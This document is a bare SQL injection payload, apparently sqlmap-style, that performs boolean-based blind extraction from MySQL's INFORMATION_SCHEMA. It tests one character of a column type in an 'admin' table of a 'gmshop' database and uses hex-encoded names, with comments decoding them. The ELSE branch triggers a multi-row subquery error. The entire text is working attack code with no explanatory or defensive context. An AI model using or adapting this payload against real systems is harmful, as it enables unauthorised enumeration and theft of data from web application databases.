(SELECT
    (CASE
        WHEN (ORD(MID((SELECT IFNULL(CAST(column_type AS NCHAR),0x20)
            FROM INFORMATION_SCHEMA.COLUMNS
            WHERE table_name=0x61646d696e AND -- 0x61646d696e = admin
            column_name=0x62436f6d6d61696c5f6248746d6c AND -- bCommail_bHtml
            table_schema=0x676d73686f70),11,1))>1) -- 0x676d73686f70 = gmshop
        THEN 0x6e616d65 -- name
        ELSE (SELECT 7218 UNION SELECT 5801)
    END)
)



